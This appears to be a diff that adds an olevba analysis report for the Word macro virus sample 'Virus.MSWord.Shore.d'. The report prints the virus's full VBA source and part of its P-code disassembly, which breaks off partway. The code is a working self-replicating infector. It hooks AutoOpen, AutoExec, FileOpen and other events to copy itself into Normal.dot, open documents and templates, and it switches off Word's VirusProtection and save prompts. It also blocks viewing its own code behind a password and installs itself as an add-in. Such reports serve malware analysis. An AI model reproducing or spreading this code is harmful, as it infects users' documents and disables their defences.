@@ -1,0 +1,2117 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Virus.MSWord.Shore.d
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Virus.MSWord.Shore.d - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Offee.bas 
+in file: Virus.MSWord.Shore.d - OLE stream: 'Macros/VBA/Offee'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+'
+'Thanks to cyberHack, Astia, Marker, BPPHCK, etc.
+'I love ITS
+'
+'Public declaration
+'
+'
+Public Const SeriesNumber = 2017
+Public Const ModuleName = "Offee", mw = "Microsoft Word", _
+        OFC = "Offshore Engineering", _
+        Peace = "Peace at the sea...", _
+        SerNum$ = "Series Number", _
+        pass = "Password ", _
+        badboy = "Want to be a bad boy....", _
+        scrollCap = "Normal." & ModuleName & ".scrollCaption", _
+        scrollCap2 = "Normal." & ModuleName & ".scrollCaption2", _
+        ScrollingProc = "Normal." & ModuleName & ".Scrolling", _
+        ScrollStringProc = "Normal." & ModuleName & ".ScrollString", _
+        AnimationProc = "Normal." & ModuleName & ".Animation"
+
+Public Const msg = "Unable to get the access. Request aborted...", _
+        aaa = "§·_n²__", bbb = "wenni", ccc = "cool", _
+        abadacc = "Bad access...", _
+        code = "backbone130274", ddd = "junkies9908", eee = "Timor9909"
+
+Public anIter As Integer
+Public AppCaption As String, AppCaptionPos As Integer, _
+        WinCaption As String, WinCaptionPos As Integer, _
+        Seq As Integer, Iteration As Integer
+
+Public anCap As String, anPos As Integer, anSeq As Integer, _
+        ToolsOptionsDlg As Dialog, _
+        OrganizerDlg As Dialog, _
+        ToolsTemplatesDlg As Dialog, _
+        ToolsMacrosDlg As Dialog, _
+        FormatStyleDlg As Dialog, _
+        MasterOffee As String
+
+'procedures in Offee2000 module
+'
+Sub ClearAddDocProp()
+Dim aDocProp As DocumentProperty
+    For Each aDocProp In NormalTemplate.CustomDocumentProperties
+        aDocProp.Delete
+    Next aDocProp
+    
+    NormalTemplate.CustomDocumentProperties.Add _
+            Name:=SerNum$, _
+            Type:=msoPropertyTypeNumber, _
+            Value:=SeriesNumber, _
+            LinkToContent:=False
+End Sub
+
+
+Function getDocPropExist(theObject As Object) As Boolean
+Dim adp As DocumentProperty
+    getDocPropExist = False
+    For Each adp In theObject.CustomDocumentProperties
+    With adp
+        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
+            .Value = SeriesNumber Then
+            getDocPropExist = True
+            Exit Function
+        End If
+    End With
+    Next adp
+End Function
+
+Function getModuleExist(theObject As Object) As Boolean
+Dim aDocProp As DocumentProperty
+    getModuleExist = False
+    For Each anObject In theObject.VBProject.VBComponents
+        If anObject.Name = ModuleName Then
+            getModuleExist = True
+            Exit Function
+        End If
+    Next anObject
+End Function
+    
+Function getInfected(theObject As Object) As Boolean
+    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
+End Function
+
+Sub clearMacros(theObject As Object)
+Dim aDocProp As DocumentProperty
+    For Each anObject In theObject.VBProject.VBComponents
+        If anObject.Name <> "ThisDocument" Then
+            Application.OrganizerDelete Source:=theObject.FullName, _
+            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
+        Else
+            On Error Resume Next
+            With anObject.CodeModule
+                .DeleteLines 1, .CountOfLines
+            End With
+        End If
+    Next anObject
+    
+    For Each aDocProp In theObject.CustomDocumentProperties
+        aDocProp.Delete
+    Next aDocProp
+End Sub
+
+Sub copyMacros(theSource As Object, theDestination As Object)
+Dim aDocProp As DocumentProperty
+    If Not getDocPropExist(theDestination) Then _
+        theDestination.CustomDocumentProperties.Add _
+            Name:=SerNum$, _
+            Type:=msoPropertyTypeNumber, _
+            Value:=SeriesNumber, _
+            LinkToContent:=False
+
+    On Error Resume Next
+        Application.OrganizerCopy _
+            Source:=theSource.FullName, _
+            Destination:=theDestination.FullName, _
+            Name:=ModuleName, _
+            Object:=wdOrganizerObjectProjectItems
+End Sub
+
+Sub Infecting(theSource As Object, theDestination As Object)
+    On Error Resume Next
+    If Not getInfected(theSource) Then Exit Sub
+    If Not getInfected(theDestination) Then
+        Application.OrganizerRename _
+            Source:=theDestination.FullName, _
+            Name:=ModuleName, newname:="xxxx", _
+            Object:=wdOrganizerObjectProjectItems
+        clearMacros theDestination
+        copyMacros theSource, theDestination
+        theDestination.Save True
+    End If
+End Sub
+
+Sub Copy2Normal()
+Dim ATemp As Template, AI As AddIn, ADoc As Document
+    Stealth
+    On Error Resume Next
+    If getInfected(ActiveDocument) Then GoTo Jump2
+    
+    If Documents.Count > 0 Then
+        For Each ADoc In Documents
+            If getInfected(ADoc) Then
+                Infecting ADoc, ActiveDocument
+                GoTo Jump2
+            End If
+        Next ADoc
+    End If
+    
+    If Templates.Count > 0 Then
+        For Each ATemp In Templates
+            If getInfected(ATemp) Then
+                Infecting ATemp, ActiveDocument
+                GoTo Jump2
+            End If
+        Next ATemp
+    End If
+
+Jump2:
+    If Documents.Count > 0 Then
+        Infecting ActiveDocument, NormalTemplate
+        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
+            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
+        If Templates.Count > 0 Then
+            For Each ATemp In Templates
+                Infecting ActiveDocument, ATemp
+            Next ATemp
+        End If
+    End If
+
+    With NormalTemplate.VBProject.VBComponents(1).CodeModule
+        .DeleteLines 1, .CountOfLines
+    End With
+
+    NormalTemplate.Save
+    CreateMasterOffee
+End Sub
+
+Sub Copy2Document()
+Dim ADoc As Document, ATemp As Template
+    Stealth
+    On Error Resume Next
+    If Not getInfected(NormalTemplate) Then
+        If getInfected(ActiveDocument) Then
+            Copy2Normal
+        Else
+            For Each ADoc In Documents
+                If getInfected(ADoc) Then
+                    Infecting ADoc, NormalTemplate
+                    GoTo Jump1
+                End If
+            Next ADoc
+            
+            For Each ATemp In Templates
+                If getInfected(ATemp) Then
+                    Infecting ATemp, NormalTemplate
+                    GoTo Jump1
+                End If
+            Next ATemp
+        End If
+    End If
+
+    If Not getInfected(NormalTemplate) Then
+        Application.StatusBar = ModuleName & " has lost forever...."
+        Exit Sub
+    End If
+
+Jump1:
+    For Each ADoc In Documents
+        Infecting NormalTemplate, ADoc
+        On Error Resume Next
+        WordBasic.viewpage
+
+        If ADoc.AttachedTemplate <> NormalTemplate Then
+            Infecting NormalTemplate, ADoc.AttachedTemplate
+            ADoc.AttachedTemplate = NormalTemplate
+        End If
+    Next ADoc
+End Sub
+
+
+Sub CreateMasterOffee()
+Dim ADoc As Document, AI As AddIn, GoOn As Boolean, Win As Window
+    
+    On Error Resume Next
+    For Each AI In AddIns
+        off$ = Left$(AI.Name, Len(ModuleName))
+        If off$ = ModuleName Then AI.Delete
+    Next AI
+    
+    If getInfected(NormalTemplate) Then
+        MasterOffee = Options.DefaultFilePath(wdPicturesPath) & "\" & ModuleName & Str(SeriesNumber) & ".dot"
+        Set ADoc = NormalTemplate.OpenAsDocument
+        With ADoc
+            .SaveAs fileName:=MasterOffee, FileFormat:=wdFormatTemplate, _
+                AddToRecentFiles:=False
+            .Close saveChanges:=wdDoNotSaveChanges
+        End With
+    
+        AddIns.Add fileName:=MasterOffee, install:=True
+    End If
+End Sub
+
+
+'infection procedures
+Sub AutoOpen()
+    AnimateCaption
+    Stealth
+    WordBasic.disableautomacros True
+    
+    On Error Resume Next
+    Copy2Normal
+    Copy2Document
+    NormalTemplate.Save
+End Sub
+
+Sub FileOpen()
+    AnimateCaption
+    Stealth
+    WordBasic.disableautomacros True
+    
+    On Error Resume Next
+    If Dialogs(wdDialogFileOpen).Show <> 0 Then
+        Copy2Document
+        Copy2Normal
+        On Error Resume Next
+        ActiveDocument.Save
+    End If
+    WordBasic.disableautomacros False
+End Sub
+
+Sub AutoClose()
+    AnimateCaption
+    Stealth
+    
+    On Error Resume Next
+    Copy2Document
+    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
+'    ActiveDocument.Saved = True
+    ModifyAttr ActiveDocument.FullName
+End Sub
+
+Sub FileClose()
+Dim afn As String
+    WordBasic.disableautomacros True
+    
+    On Error Resume Next
+    AutoClose
+    afn = ActiveDocument.FullName
+    ActiveDocument.Close
+    ModifyAttr afn
+    WordBasic.disableautomacros False
+End Sub
+
+
+
+
+Sub InitDialog()
+    AnimateCaption
+    Stealth
+    Application.DisplayAlerts = wdAlertsNone
+    On Error Resume Next
+    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
+    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
+    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
+    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
+    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
+End Sub
+    
+    
+Sub AutoExec()
+Dim Combar As CommandBar
+    WordBasic.disableautomacros True
+    InitDialog
+    
+    Copy2Normal
+    Copy2Document
+    ModifyAttr NormalTemplate.FullName
+    ClearAddDocProp
+    For Each Combar In Application.CommandBars
+        On Error Resume Next
+        Combar.reset
+    Next Combar
+End Sub
+
+Sub AutoExit()
+    AutoOpen
+    ModifyAttr NormalTemplate.FullName
+End Sub
+
+Sub AutoNew()
+    AutoExit
+End Sub
+
+Sub fileNewDefault()
+    AnimateCaption
+    Stealth
+    WordBasic.fileNewDefault
+    AutoExit
+End Sub
+
+Sub FileNew()
+    AnimateCaption
+    If Dialogs(wdDialogFileNew).Show <> 0 Then AutoExit
+End Sub
+
+Sub Stealth()
+    On Error Resume Next
+    With Options
+        .SaveNormalPrompt = False
+        .SavePropertiesPrompt = False
+        .VirusProtection = False
+    End With
+    
+    With NormalTemplate
+        If .Saved = False Then .Save
+    End With
+End Sub
+
+Sub NoStealth()
+    With Options
+        .SaveNormalPrompt = True
+        .SavePropertiesPrompt = True
+        .VirusProtection = True
+    End With
+    
+    On Error Resume Next
+    With NormalTemplate
+        If .Saved = False Then .Save
+    End With
+End Sub
+
+Sub ToolsOptions()
+    InitDialog
+    NoStealth
+    
+    On Error Resume Next
+    WordBasic.ToolsOptions
+    Stealth
+End Sub
+
+
+Sub NoAccess()
+    a = MsgBox(msg, vbExclamation, abadacc)
+    Stealth
+    AnimateCaption
+End Sub
+
+Function PassDialog() As Boolean
+Dim Cruel As String, Passi As String
+    PassDialog = False
+    Cruel = ccc + Mid(code, 9, 2)
+    Passi = pass & "(" & ModuleName & Str(SeriesNumber) & ")  : "
+    If LCase(InputBox(Passi, badboy)) = Cruel Then
+        PassDialog = True
+    Else
+        NoAccess
+    End If
+End Function
+
+
+Sub ToolsMacro()
+    InitDialog
+    ToolsMacrosDlg.Display
+End Sub
+
+
+Sub FileTemplates()
+    InitDialog
+    ToolsTemplatesDlg.Display
+End Sub
+
+Sub ViewVbCode()
+    AnimateCaption
+    Stealth
+    Application.ShowVisualBasicEditor = PassDialog
+End Sub
+
+Sub viewcode()
+    ViewVbCode
+End Sub
+
+Sub Organizer()
+    InitDialog
+    OrganizerDlg.Display
+End Sub
+
+Sub FormatStyle()
+    InitDialog
+    With FormatStyleDlg
+        .Display
+        .Execute
+    End With
+End Sub
+
+
+Sub ModifyAttr(fileName As String)
+    On Error Resume Next
+    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
+End Sub
+
+
+Sub AnimateCaption()
+    On Error Resume Next
+    If Documents.Count > 0 Then WordBasic.viewpage
+    
+    Seq = 0
+    Iteration = 0
+    Application.OnTime Now + TimeSerial(0, 0, 3), ScrollStringProc
+End Sub
+
+Sub ScrollString()
+    Select Case Seq
+        Case 0
+            AppCaption = OFC
+            WinCaption = Peace
+            Seq = 1
+        Case Else
+            AppCaption = mw
+            RestoreWindowCaption
+            If Documents.Count > 0 Then
+                WinCaption = ActiveDocument.FullName
+            Else
+                WinCaption = " "
+            End If
+            Seq = 0
+    End Select
+    
+    On Error Resume Next
+    AppCaptionPos = 0
+    WinCaptionPos = 0
+    Iteration = Iteration + 1
+    
+    Application.OnTime Now + TimeSerial(0, 0, 3), ScrollingProc
+End Sub
+
+Sub Scrolling()
+    Application.Caption = Right$(AppCaption, AppCaptionPos)
+    AppCaptionPos = AppCaptionPos + 1
+    
+    If Documents.Count > 0 Then _
+        ActiveWindow.Caption = Right$(WinCaption, WinCaptionPos)
+    WinCaptionPos = WinCaptionPos + 1
+    
+    If WinCaptionPos > Len(WinCaption) And Len(AppCaption) < AppCaptionPos Then
+        If Seq = 1 Then
+            Application.OnTime Now + TimeSerial(0, 0, 3), ScrollStringProc
+        ElseIf Seq = 0 Then
+            If Iteration < 5 Then
+                Copy2Document
+'                Copy2Normal
+                Application.OnTime Now + TimeSerial(0, 0, 10), ScrollStringProc
+            Else
+'                Copy2Normal
+                Exit Sub
+            End If
+        End If
+    Else
+        Application.OnTime Now + TimeSerial(0, 0, 0.5), ScrollingProc
+    End If
+End Sub
+
+Sub RestoreWindowCaption()
+Dim Win As Window
+    On Error Resume Next
+    For Each Win In Windows
+        Win.Caption = Win.Document.FullName
+    Next Win
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: Virus.MSWord.Shore.d
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 1182 bytes
+' Macros/VBA/Offee - 32910 bytes
+' Line #0:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1:
+' 	QuoteRem 0x0000 0x0030 "Thanks to cyberHack, Astia, Marker, BPPHCK, etc."
+' Line #2:
+' 	QuoteRem 0x0000 0x000A "I love ITS"
+' Line #3:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #4:
+' 	QuoteRem 0x0000 0x0012 "Public declaration"
+' Line #5:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #6:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #7:
+' 	Dim (Public Const) 
+' 	LitDI2 0x07E1 
+' 	VarDefn SeriesNumber
+' Line #8:
+' 	LineCont 0x0028 0A 00 08 00 0E 00 08 00 12 00 08 00 16 00 08 00 1A 00 08 00 1E 00 08 00 26 00 08 00 2E 00 08 00 36 00 08 00 3E 00 08 00
+' 	Dim (Public Const) 
+' 	LitStr 0x0005 "Offee"
+' 	VarDefn ModuleName
+' 	LitStr 0x000E "Microsoft Word"
+' 	VarDefn mw
+' 	LitStr 0x0014 "Offshore Engineering"
+' 	VarDefn OFC
+' 	LitStr 0x0013 "Peace at the sea..."
+' 	VarDefn Peace
+' 	LitStr 0x000D "Series Number"
+' 	VarDefn SerNum
+' 	LitStr 0x0009 "Password "
+' 	VarDefn pass
+' 	LitStr 0x0018 "Want to be a bad boy...."
+' 	VarDefn badboy
+' 	LitStr 0x0007 "Normal."
+' 	Ld ModuleName 
+' 	Concat 
+' 	LitStr 0x000E ".scrollCaption"
+' 	Concat 
+' 	VarDefn scrollCap
+' 	LitStr 0x0007 "Normal."
+' 	Ld ModuleName 
+' 	Concat 
+' 	LitStr 0x000F ".scrollCaption2"
+' 	Concat 
+' 	VarDefn scrollCap2
+' 	LitStr 0x0007 "Normal."
+' 	Ld ModuleName 
+' 	Concat 
+' 	LitStr 0x000A ".Scrolling"
+' 	Concat 
+' 	VarDefn ScrollingProc
+' 	LitStr 0x0007 "Normal."
+' 	Ld ModuleName 
+' 	Concat 
+' 	LitStr 0x000D ".ScrollString"
+' 	Concat 
+' 	VarDefn ScrollStringProc
+' 	LitStr 0x0007 "Normal."
+' 	Ld ModuleName 
+' 	Concat 
+' 	LitStr 0x000A ".Animation"
+' 	Concat 
+' 	VarDefn AnimationProc
+' Line #9:
+' Line #10:
+' 	LineCont 0x000C 06 00 08 00 12 00 08 00 16 00 08 00
+' 	Dim (Public Const) 
+' 	LitStr 0x002C "Unable to get the access. Request aborted..."
+' 	VarDefn msg
+' 	LitStr 0x0007 "§·_n²__"
+' 	VarDefn aaa
+' 	LitStr 0x0005 "wenni"
+' 	VarDefn bbb
+' 	LitStr 0x0004 "cool"
+' 	VarDefn ccc
+' 	LitStr 0x000D "Bad access..."
+' 	VarDefn abadacc
+' 	LitStr 0x000E "backbone130274"
+' 	VarDefn code
+' 	LitStr 0x000B "junkies9908"
+' 	VarDefn ddd
+' 	LitStr 0x0009 "Timor9909"
+' 	VarDefn eee
+' Line #11:
+' Line #12:
+' 	Dim (Public) 
+' 	VarDefn anIter (As Integer)
+' Line #13:
+' 	LineCont 0x0008 09 00 08 00 11 00 08 00
+' 	Dim (Public) 
+' 	VarDefn AppCaption (As String)
+' 	VarDefn AppCaptionPos (As Integer)
+' 	VarDefn WinCaption (As String)
+' 	VarDefn WinCaptionPos (As Integer)
+' 	VarDefn Seq (As Integer)
+' 	VarDefn Iteration (As Integer)
+' Line #14:
+' Line #15:
+' 	LineCont 0x0018 0D 00 08 00 11 00 08 00 15 00 08 00 19 00 08 00 1D 00 08 00 21 00 08 00
+' 	Dim (Public) 
+' 	VarDefn anCap (As String)
+' 	VarDefn anPos (As Integer)
+' 	VarDefn anSeq (As Integer)
+' 	VarDefn ToolsOptionsDlg
+' 	VarDefn OrganizerDlg
+' 	VarDefn ToolsTemplatesDlg
+' 	VarDefn ToolsMacrosDlg
+' 	VarDefn FormatStyleDlg
+' 	VarDefn MasterOffee (As String)
+' Line #16:
+' Line #17:
+' 	QuoteRem 0x0000 0x001E "procedures in Offee2000 module"
+' Line #18:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #19:
+' 	FuncDefn (Sub ClearAddDocProp())
+' Line #20:
+' 	Dim 
+' 	VarDefn aDocProp (As DocumentProperty)
+' Line #21:
+' 	StartForVariable 
+' 	Ld aDocProp 
+' 	EndForVariable 
+' 	Ld NormalTemplate 
+' 	MemLd CustomDocumentProperties 
+' 	ForEach 
+' Line #22:
+' 	Ld aDocProp 
+' 	ArgsMemCall Delete 0x0000 
+' Line #23:
+' 	StartForVariable 
+' 	Ld aDocProp 
+' 	EndForVariable 
+' 	NextVar 
+' Line #24:
+' Line #25:
+' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
+' 	Ld SerNum$ 
+' 	ParamNamed New 
+' 	Ld msoPropertyTypeNumber 
+' 	ParamNamed TypeOf 
+' 	Ld SeriesNumber 
+' 	ParamNamed Value 
+' 	LitVarSpecial (False)
+' 	ParamNamed LinkToContent 
+' 	Ld NormalTemplate 
+' 	MemLd CustomDocumentProperties 
+' 	ArgsMemCall Add 0x0004 
+' Line #26:
+' 	EndSub 
+' Line #27:
+' Line #28:
+' Line #29:
+' 	FuncDefn (Function getDocPropExist(theObject As Object) As Boolean)
+' Line #30:
+' 	Dim 
+' 	VarDefn adp (As DocumentProperty)
+' Line #31:
+' 	LitVarSpecial (False)
+' 	St getDocPropExist 
+' Line #32:
+' 	StartForVariable 
+' 	Ld adp 
+' 	EndForVariable 
+' 	Ld theObject 
+' 	MemLd CustomDocumentProperties 
+' 	ForEach 
+' Line #33:
+' 	StartWithExpr 
+' 	Ld adp 
+' 	With 
+' Line #34:
+' 	LineCont 0x0004 0B 00 0C 00
+' 	MemLdWith New 
+' 	Ld SerNum$ 
+' 	Eq 
+' 	MemLdWith TypeOf 
+' 	Ld msoPropertyTypeNumber 
+' 	Eq 
+' 	And 
+' 	MemLdWith Value 
+' 	Ld SeriesNumber 
+' 	Eq 
+' 	And 
+' 	IfBlock 
+' Line #35:
+' 	LitVarSpecial (True)
+' 	St getDocPropExist 
+' Line #36:
+' 	ExitFunc 
+' Line #37:
+' 	EndIfBlock 
+' Line #38:
+' 	EndWith 
+' Line #39:
+' 	StartForVariable 
+' 	Ld adp 
+' 	EndForVariable 
+' 	NextVar 
+' Line #40:
+' 	EndFunc 
+' Line #41:
+' Line #42:
+' 	FuncDefn (Function getModuleExist(theObject As Object) As Boolean)
+' Line #43:
+' 	Dim 
+' 	VarDefn aDocProp (As DocumentProperty)
+' Line #44:
+' 	LitVarSpecial (False)
+' 	St getModuleExist 
+' Line #45:
+' 	StartForVariable 
+' 	Ld anObject 
+' 	EndForVariable 
+' 	Ld theObject 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ForEach 
+' Line #46:
+' 	Ld anObject 
+' 	MemLd New 
+' 	Ld ModuleName 
+' 	Eq 
+' 	IfBlock 
+' Line #47:
+' 	LitVarSpecial (True)
+' 	St getModuleExist 
+' Line #48:
+' 	ExitFunc 
+' Line #49:
+' 	EndIfBlock 
+' Line #50:
+' 	StartForVariable 
+' 	Ld anObject 
+' 	EndForVariable 
+' 	NextVar 
+' Line #51:
+' 	EndFunc 
+' Line #52:
+' Line #53:
+' 	FuncDefn (Function getInfected(theObject As Object) As Boolean)
+' Line #54:
+' 	Ld theObject 
+' 	ArgsLd getModuleExist 0x0001 
+' 	Ld theObject 
+' 	ArgsLd getDocPropExist 0x0001 
+' 	And 
+' 	St getInfected 
+' Line #55:
+' 	EndFunc 
+' Line #56:
+' Line #57:
+' 	FuncDefn (Sub clearMacros(theObject As Object))
+' Line #58:
+' 	Dim 
+' 	VarDefn aDocProp (As DocumentProperty)
+' Line #59:
+' 	StartForVariable 
+' 	Ld anObject 
+' 	EndForVariable 
+' 	Ld theObject 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ForEach 
+' Line #60:
+' 	Ld anObject 
+' 	MemLd New 
+' 	LitStr 0x000C "ThisDocument"
+' 	Ne 
+' 	IfBlock 
+' Line #61:
+' 	LineCont 0x0004 09 00 0C 00
+' 	Ld theObject 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld anObject 
+' 	MemLd New 
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerDelete 0x0003 
+' Line #62:
+' 	ElseBlock 
+' Line #63:
+' 	OnError (Resume Next) 
+' Line #64:
+' 	StartWithExpr 
+' 	Ld anObject 
+' 	MemLd CodeModule 
+' 	With 
+' Line #65:
+' 	LitDI2 0x0001 
+' 	MemLdWith CountOfLines 
+' 	ArgsMemCallWith DeleteLines 0x0002 
+' Line #66:
+' 	EndWith 
+' Line #67:
+' 	EndIfBlock 
+' Line #68:
+' 	StartForVariable 
+' 	Ld anObject 
+' 	EndForVariable 
+' 	NextVar 
+' Line #69:
+' Line #70:
+' 	StartForVariable 
+' 	Ld aDocProp 
+' 	EndForVariable 
+' 	Ld theObject 
+' 	MemLd CustomDocumentProperties 
+' 	ForEach 
+' Line #71:
+' 	Ld aDocProp 
+' 	ArgsMemCall Delete 0x0000 
+' Line #72:
+' 	StartForVariable 
+' 	Ld aDocProp 
+' 	EndForVariable 
+' 	NextVar 
+' Line #73:
+' 	EndSub 
+' Line #74:
+' Line #75:
+' 	FuncDefn (Sub copyMacros(theSource As Object, theDestination As Object))
+' Line #76:
+' 	Dim 
+' 	VarDefn aDocProp (As DocumentProperty)
+' Line #77:
+' 	LineCont 0x0014 07 00 08 00 0C 00 0C 00 10 00 0C 00 14 00 0C 00 18 00 0C 00
+' 	Ld theDestination 
+' 	ArgsLd getDocPropExist 0x0001 
+' 	Not 
+' 	If 
+' 	BoSImplicit 
+' 	Ld SerNum$ 
+' 	ParamNamed New 
+' 	Ld msoPropertyTypeNumber 
+' 	ParamNamed TypeOf 
+' 	Ld SeriesNumber 
+' 	ParamNamed Value 
+' 	LitVarSpecial (False)
+' 	ParamNamed LinkToContent 
+' 	Ld theDestination 
+' 	MemLd CustomDocumentProperties 
+' 	ArgsMemCall Add 0x0004 
+' 	EndIf 
+' Line #78:
+' Line #79:
+' 	OnError (Resume Next) 
+' Line #80:
+' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
+' 	Ld theSource 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld theDestination 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	Ld ModuleName 
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #81:
+' 	EndSub 
+' Line #82:
+' Line #83:
+' 	FuncDefn (Sub Infecting(theSource As Object, theDestination As Object))
+' Line #84:
+' 	OnError (Resume Next) 
+' Line #85:
+' 	Ld theSource 
+' 	ArgsLd getInfected 0x0001 
+' 	Not 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #86:
+' 	Ld theDestination 
+' 	ArgsLd getInfected 0x0001 
+' 	Not 
+' 	IfBlock 
+' Line #87:
+' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 11 00 0C 00
+' 	Ld theDestination 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ModuleName 
+' 	ParamNamed New 
+' 	LitStr 0x0004 "xxxx"
+' 	ParamNamed newname 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerRename 0x0004 
+' Line #88:
+' 	Ld theDestination 
+' 	ArgsCall clearMacros 0x0001 
+' Line #89:
+' 	Ld theSource 
+' 	Ld theDestination 
+' 	ArgsCall copyMacros 0x0002 
+' Line #90:
+' 	LitVarSpecial (True)
+' 	Ld theDestination 
+' 	ArgsMemCall Save 0x0001 
+' Line #91:
+' 	EndIfBlock 
+' Line #92:
+' 	EndSub 
+' Line #93:
+' Line #94:
+' 	FuncDefn (Sub Copy2Normal())
+' Line #95:
+' 	Dim 
+' 	VarDefn ATemp (As Template)
+' 	VarDefn AI (As AddIn)
+' 	VarDefn ADoc (As Document)
+' Line #96:
+' 	ArgsCall Stealth 0x0000 
+' Line #97:
+' 	OnError (Resume Next) 
+' Line #98:
+' 	Ld ActiveDocument 
+' 	ArgsLd getInfected 0x0001 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo Jump2 
+' 	EndIf 
+' Line #99:
+' Line #100:
+' 	Ld Documents 
+' 	MemLd Count 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	IfBlock 
+' Line #101:
+' 	StartForVariable 
+' 	Ld ADoc 
+' 	EndForVariable 
+' 	Ld Documents 
+' 	ForEach 
+' Line #102:
+' 	Ld ADoc 
+' 	ArgsLd getInfected 0x0001 
+' 	IfBlock 
+' Line #103:
+' 	Ld ADoc 
+' 	Ld ActiveDocument 
+' 	ArgsCall Infecting 0x0002 
+' Line #104:
+' 	GoTo Jump2 
+' Line #105:
+' 	EndIfBlock 
+' Line #106:
+' 	StartForVariable 
+' 	Ld ADoc 
+' 	EndForVariable 
+' 	NextVar 
+' Line #107:
+' 	EndIfBlock 
+' Line #108:
+' Line #109:
+' 	Ld Templates 
+' 	MemLd Count 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	IfBlock 
+' Line #110:
+' 	StartForVariable 
+' 	Ld ATemp 
+' 	EndForVariable 
+' 	Ld Templates 
+' 	ForEach 
+' Line #111:
+' 	Ld ATemp 
+' 	ArgsLd getInfected 0x0001 
+' 	IfBlock 
+' Line #112:
+' 	Ld ATemp 
+' 	Ld ActiveDocument 
+' 	ArgsCall Infecting 0x0002 
+' Line #113:
+' 	GoTo Jump2 
+' Line #114:
+' 	EndIfBlock 
+' Line #115:
+' 	StartForVariable 
+' 	Ld ATemp 
+' 	EndForVariable 
+' 	NextVar 
+' Line #116:
+' 	EndIfBlock 
+' Line #117:
+' Line #118:
+' 	Label Jump2 
+' Line #119:
+' 	Ld Documents 
+' 	MemLd Count 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	IfBlock 
+' Line #120:
+' 	Ld ActiveDocument 
+' 	Ld NormalTemplate 
+' 	ArgsCall Infecting 0x0002 
+' Line #121:
+' 	LineCont 0x0004 07 00 0C 00
+' 	Ld ActiveDocument 
+' 	MemLd AttachedTemplate 
+' 	Ld NormalTemplate 
+' 	Ne 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ActiveDocument 
+' 	Ld ActiveDocument 
+' 	MemLd AttachedTemplate 
+' 	ArgsCall Infecting 0x0002 
+' 	EndIf 
+' Line #122:
+' 	Ld Templates 
+' 	MemLd Count 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	IfBlock 
+' Line #123:
+' 	StartForVariable 
+' 	Ld ATemp 
+' 	EndForVariable 
+' 	Ld Templates 
+' 	ForEach 
+' Line #124:
+' 	Ld ActiveDocument 
+' 	Ld ATemp 
+' 	ArgsCall Infecting 0x0002 
+' Line #125:
+' 	StartForVariable 
+' 	Ld ATemp 
+' 	EndForVariable 
+' 	NextVar 
+' Line #126:
+' 	EndIfBlock 
+' Line #127:
+' 	EndIfBlock 
+' Line #128:
+' Line #129:
+' 	StartWithExpr 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	With 
+' Line #130:
+' 	LitDI2 0x0001 
+' 	MemLdWith CountOfLines 
+' 	ArgsMemCallWith DeleteLines 0x0002 
+' Line #131:
+' 	EndWith 
+' Line #132:
+' Line #133:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #134:
+' 	ArgsCall CreateMasterOffee 0x0000 
+' Line #135:
+' 	EndSub 
+' Line #136:
+' Line #137:
+' 	FuncDefn (Sub Copy2Document())
+' Line #138:
+' 	Dim 
+' 	VarDefn ADoc (As Document)
